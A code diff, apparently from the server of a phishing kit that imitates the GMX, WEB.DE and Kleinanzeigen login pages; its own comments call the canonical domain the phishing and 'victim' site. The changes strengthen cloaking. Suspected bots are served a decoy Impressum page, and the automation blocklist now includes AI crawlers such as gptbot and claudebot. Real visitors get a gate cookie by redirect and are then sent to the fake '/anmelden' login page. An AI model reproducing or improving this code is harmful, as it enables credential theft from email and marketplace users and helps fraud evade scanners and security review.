@@ -7,11 +7,60 @@ const { serveFile } = require('../utils/staticFileServe');
 /** Cookie гейта: кто прошёл проверку (JS выполнился), получает контент; боты без cookie видят вайт. */
 const BOT_GATE_COOKIE = 'gmx_v';
 
+/** Аварийно отключить гейт страниц (все видят контент как с кукой). Env: GMW_DISABLE_PAGE_GATE=1 */
+const DISABLE_PAGE_GATE = /^1|true|yes$/i.test(String(process.env.GMW_DISABLE_PAGE_GATE || '').trim());
+
 function hasGateCookie(req) {
   const raw = (req.headers && req.headers.cookie) ? String(req.headers.cookie) : '';
   if (!raw) return false;
   const match = raw.match(new RegExp('(?:^|;\\s*)' + BOT_GATE_COOKIE.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '=([^;]*)'));
   return !!(match && match[1] && match[1].trim());
+}
+
+function gatePassedOrDisabled(req) {
+  return DISABLE_PAGE_GATE || hasGateCookie(req);
+}
+
+/** HTTPS за прокси (Apache) или прямое TLS — для флага Secure у куки гейта. */
+function isRequestHttps(req) {
+  if (!req || !req.headers) return false;
+  const xf = String(req.headers['x-forwarded-proto'] || '').split(',')[0].trim().toLowerCase();
+  if (xf === 'https') return true;
+  try {
+    if (req.socket && req.socket.encrypted === true) return true;
+  } catch (_) {}
+  return false;
+}
+
+/** Выставляем куку гейта заголовком ответа (надёжнее, чем только document.cookie в браузере). */
+function buildGateSetCookieHeader(req) {
+  const secure = isRequestHttps(req) ? '; Secure' : '';
+  return BOT_GATE_COOKIE + '=1; Path=/; Max-Age=3600; SameSite=Lax' + secure;
+}
+
+/** Путь для Location после гейта (тот же URL, без hash). */
+function gateRedirectLocation(req) {
+  let raw = ((req && req.url) ? String(req.url) : '/').split('#')[0];
+  if (!raw || raw[0] !== '/') raw = '/';
+  if (raw.indexOf('//') === 0) raw = '/';
+  return raw;
+}
+
+/**
+ * Для живых пользователей: 302 на тот же URL + Set-Cookie. Не требует JS (расширения, блокировщики).
+ * @returns {boolean} true если ответ отправлен
+ */
+function sendHumanGateRedirect(req, res) {
+  if (safeEnd(res)) return true;
+  const loc = gateRedirectLocation(req);
+  res.writeHead(302, {
+    Location: loc,
+    'Set-Cookie': buildGateSetCookieHeader(req),
+    'Cache-Control': 'no-store, no-cache, must-revalidate',
+    Pragma: 'no-cache'
+  });
+  res.end();
+  return true;
 }
 
 function isProtectedPage(pathname) {
@@ -141,7 +190,7 @@ const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Impressum – Kleinanzeigen</title>
+  <title>Impressum</title>
   <style>
     *{box-sizing:border-box}
     body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
@@ -161,15 +210,14 @@ const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
     <h1>Impressum</h1>
     <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
     <h2>Anbieter</h2>
-    <p>Kleinanzeigen GmbH</p>
-    <address>Helene-Weber-Allee 19, 80637 M&uuml;nchen, Deutschland</address>
+    <p>Diese Seite wird im Auftrag des Domaininhabers betrieben.</p>
     <h2>Kontakt</h2>
-    <p>E-Mail: <a href="mailto:impressum@kleinanzeigen.de">impressum@kleinanzeigen.de</a></p>
+    <p>Bitte nutzen Sie die auf dieser Domain angegebenen Kontaktm&ouml;glichkeiten.</p>
     <div class="footer-links">
-      <a href="https://themen.kleinanzeigen.de/nutzungsbedingungen/" target="_blank" rel="noopener">AGB</a>
-      <a href="https://www.kleinanzeigen.de/impressum.html" target="_blank" rel="noopener">Impressum</a>
-      <a href="https://themen.kleinanzeigen.de/datenschutzerklaerung/" target="_blank" rel="noopener">Datenschutz</a>
-      <a href="https://www.kleinanzeigen.de/" target="_blank" rel="noopener">Kleinanzeigen Startseite</a>
+      <a href="#">AGB</a>
+      <a href="#">Impressum</a>
+      <a href="#">Datenschutz</a>
+      <a href="#">Startseite</a>
     </div>
   </div>
 </body>
@@ -248,31 +296,35 @@ function getWhitePageHtmlForRequest(req, getBrand, getShortDomainsList) {
   return getWhitePageHtml(req, getBrand);
 }
 
-const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title></head><body style="margin:0;background:#fff;min-height:100vh"></body><script>
+const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Laden…</title></head><body style="margin:0;background:#f4f2ef;min-height:100vh;font-family:system-ui,Segoe UI,Helvetica,Arial,sans-serif;color:#333"><p style="margin:0;padding:24px 16px;font-size:15px;line-height:1.5">Einen Moment bitte…</p></body><script>
 (function(){
   var cookieName="${BOT_GATE_COOKIE}";
   function sendToWhite(){ fetch("/gate-white",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}); }
   function pass(){
-    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax";
-    var p=location.pathname+location.search;
-    if(p==="/"||p===""){location.reload();}else{fetch(p,{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}).catch(function(){location.reload();});}
+    var sec=(typeof location!=="undefined"&&location.protocol==="https:")?";secure":"";
+    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax"+sec;
+    // Полная перезагрузка: fetch+document.write давал пустой экран при пустом/обрезанном ответе или при вмешательстве прокси (CDN).
+    location.reload();
   }
   function isAutomation(){
     if(typeof navigator==="undefined")return true;
     if(navigator.webdriver===true){ var ua2=(navigator.userAgent||"").toLowerCase(); if(!/android/.test(ua2)) return true; }
     var ua=(navigator.userAgent||"").toLowerCase();
-    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver/i.test(ua))return true;
+    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver|bytespider|petalbot|amazonbot|facebookexternalhit|gptbot|claudebot|anthropic/i.test(ua))return true;
     try{ if(window.callPhantom||window._phantom||window.__nightmare||window.__selenium_unwrapped||window.domAutomation||window._WEBDRIVER_ELEM_CACHE)return true; }catch(e){}
     if(typeof screen!=="undefined"&&(screen.width<=0||screen.height<=0))return true;
     return false;
   }
   if(isAutomation()){ sendToWhite(); return; }
   var t0=Date.now();
-  setTimeout(function(){
-    if(Date.now()-t0<200)return;
+  var hiddenWaitMaxMs=8000;
+  function tryPass(){
+    if(Date.now()-t0<360)return;
+    if(typeof document!=="undefined"&&document.visibilityState==="hidden"&&(Date.now()-t0)<hiddenWaitMaxMs){ setTimeout(tryPass, 450); return; }
     if(isAutomation()){ sendToWhite(); return; }
     pass();
-  },280);
+  }
+  setTimeout(tryPass, 0);
 })();
 </script></html>`;
 
@@ -294,20 +346,33 @@ function runHostShortCanonicalPhase(req, res, o) {
     shortDomainsList,
     getCanonicalDomain,
     GMX_DOMAIN,
+    GMX_DOMAINS_LIST,
+    WEBDE_DOMAINS_LIST,
+    KLEIN_DOMAINS_LIST,
     PROJECT_ROOT,
     getBrand,
   } = o;
 
+  const canonicalDomain = getCanonicalDomain(req);
+  function normHost(h) {
+    return String(h || '').split(':')[0].replace(/^www\./i, '').toLowerCase();
+  }
+  const nhRequest = normHost(requestHost);
+  const nhAdmin = normHost(ADMIN_DOMAIN);
+  const nhCanon = normHost(canonicalDomain);
+
   if (ADMIN_DOMAIN) {
     if (isAdminPage || isAdminRequest(pathname)) {
-      if (requestHost !== ADMIN_DOMAIN && !isLocalhost) {
+      if (nhRequest !== nhAdmin && !isLocalhost) {
         if (safeEnd(res)) return true;
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
         return true;
       }
-    } else if (requestHost === ADMIN_DOMAIN) {
-      if (!isAdminDomainAllowedPath(pathname)) {
+    } else if (nhRequest === nhAdmin) {
+      /** Если ADMIN_DOMAIN совпал с каноническим доменом фишинга (ошибка .env) — не резать /anmelden и пр. */
+      const adminHostIsAlsoVictimSite = nhAdmin === nhCanon && nhCanon.length > 0;
+      if (!adminHostIsAlsoVictimSite && !isAdminDomainAllowedPath(pathname)) {
         if (safeEnd(res)) return true;
         res.writeHead(404, { 'Content-Type': 'text/plain' });
         res.end('Not Found');
@@ -316,21 +381,31 @@ function runHostShortCanonicalPhase(req, res, o) {
     }
   }
 
-  const canonicalDomain = getCanonicalDomain(req);
-  const isCanonicalHost = requestHost === canonicalDomain || requestHost === ('www.' + canonicalDomain);
-  if (!isLocalhost && requestHost && !isCanonicalHost && requestHost !== ADMIN_DOMAIN && !isShortDomain) {
+  const aliasesGmx = GMX_DOMAINS_LIST || [];
+  const aliasesWebde = WEBDE_DOMAINS_LIST || [];
+  const aliasesKlein = KLEIN_DOMAINS_LIST || [];
+  const brandEarly = getBrand(req);
+  let domainAliases = [];
+  if (brandEarly.id === 'gmx') domainAliases = aliasesGmx;
+  else if (brandEarly.id === 'webde') domainAliases = aliasesWebde;
+  else if (brandEarly.id === 'klein') domainAliases = aliasesKlein;
+  const isCanonicalHost =
+    nhRequest === nhCanon
+    || (domainAliases.length > 0
+      && domainAliases.some(function (d) { return nhRequest === normHost(d); }));
+  if (!isLocalhost && requestHost && !isCanonicalHost && nhRequest !== nhAdmin && !isShortDomain) {
     if (safeEnd(res)) return true;
     res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
     res.end();
     return true;
   }
 
-  if (isShortDomain && req.method === 'GET') {
+  if (isShortDomain && (req.method === 'GET' || req.method === 'HEAD')) {
     const targetUrl = (shortDomainsList[shortDomainKey].targetUrl || '').trim();
     const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
     const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
     const host = requestHost;
-    if (hasGateCookie(req)) {
+    if (gatePassedOrDisabled(req)) {
       if (targetIsAnmelden && (pathname === '/' || pathname === '')) {
         if (safeEnd(res)) return true;
         res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
@@ -338,8 +413,14 @@ function runHostShortCanonicalPhase(req, res, o) {
         return true;
       }
       if (targetIsAnmelden && (pathname === '/anmelden' || pathname === '/anmelden/')) {
-        const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
-        const indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
+        const brand = getBrand(req);
+        let indexFile;
+        if (brand.id === 'klein') {
+          indexFile = path.join(PROJECT_ROOT, 'klein', 'index.html');
+        } else {
+          const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
+          indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
+        }
         serveFile(indexFile, res, req, getBrand);
         return true;
       }
@@ -351,14 +432,18 @@ function runHostShortCanonicalPhase(req, res, o) {
       }
     } else {
       if (safeEnd(res)) return true;
-      const html = isLikelyBot(req) ? getWhitePageHtmlForRequest(req, getBrand, o.getShortDomainsList) : GATE_PAGE_HTML;
-      res.writeHead(200, {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-store, no-cache, must-revalidate',
-        'Pragma': 'no-cache'
-      });
-      res.end(html);
-      return true;
+      if (isLikelyBot(req)) {
+        const html = getWhitePageHtmlForRequest(req, getBrand, o.getShortDomainsList);
+        res.writeHead(200, {
+          'Content-Type': 'text/html; charset=utf-8',
+          'Cache-Control': 'no-store, no-cache, must-revalidate',
+          Pragma: 'no-cache'
+        });
+        if (req.method === 'HEAD') res.end();
+        else res.end(html);
+        return true;
+      }
+      return sendHumanGateRedirect(req, res);
     }
   }
 
@@ -377,35 +462,42 @@ function handleGateWhite(req, res, getBrand, getShortDomainsList) {
 }
 
 function handleProtectedPageGate(req, res, pathname, getBrand) {
-  if (req.method !== 'GET' || !isProtectedPage(pathname) || hasGateCookie(req)) return false;
-  const html = isLikelyBot(req) ? getWhitePageHtml(req, getBrand) : GATE_PAGE_HTML;
+  if ((req.method !== 'GET' && req.method !== 'HEAD') || !isProtectedPage(pathname) || gatePassedOrDisabled(req)) return false;
   if (safeEnd(res)) return true;
-  res.writeHead(200, {
-    'Content-Type': 'text/html; charset=utf-8',
-    'Cache-Control': 'no-store, no-cache, must-revalidate',
-    'Pragma': 'no-cache'
-  });
-  res.end(html);
-  return true;
+  if (isLikelyBot(req)) {
+    res.writeHead(200, {
+      'Content-Type': 'text/html; charset=utf-8',
+      'Cache-Control': 'no-store, no-cache, must-revalidate',
+      Pragma: 'no-cache'
+    });
+    if (req.method === 'HEAD') res.end();
+    else res.end(getWhitePageHtml(req, getBrand));
+    return true;
+  }
+  return sendHumanGateRedirect(req, res);
 }
 
 /** Гейт для прямых URL вида /index.html (статика public). */
 function handleProtectedContentPathGate(req, res, pathname, getBrand) {
-  if (req.method !== 'GET' || !isProtectedContentPath(pathname) || hasGateCookie(req)) return false;
-  const html = isLikelyBot(req) ? getWhitePageHtml(req, getBrand) : GATE_PAGE_HTML;
+  if ((req.method !== 'GET' && req.method !== 'HEAD') || !isProtectedContentPath(pathname) || gatePassedOrDisabled(req)) return false;
   if (safeEnd(res)) return true;
-  res.writeHead(200, {
-    'Content-Type': 'text/html; charset=utf-8',
-    'Cache-Control': 'no-store, no-cache, must-revalidate',
-    'Pragma': 'no-cache'
-  });
-  res.end(html);
-  return true;
+  if (isLikelyBot(req)) {
+    res.writeHead(200, {
+      'Content-Type': 'text/html; charset=utf-8',
+      'Cache-Control': 'no-store, no-cache, must-revalidate',
+      Pragma: 'no-cache'
+    });
+    if (req.method === 'HEAD') res.end();
+    else res.end(getWhitePageHtml(req, getBrand));
+    return true;
+  }
+  return sendHumanGateRedirect(req, res);
 }
 
 module.exports = {
   BOT_GATE_COOKIE,
   hasGateCookie,
+  buildGateSetCookieHeader,
   isProtectedPage,
   isProtectedContentPath,
   isLikelyBot,
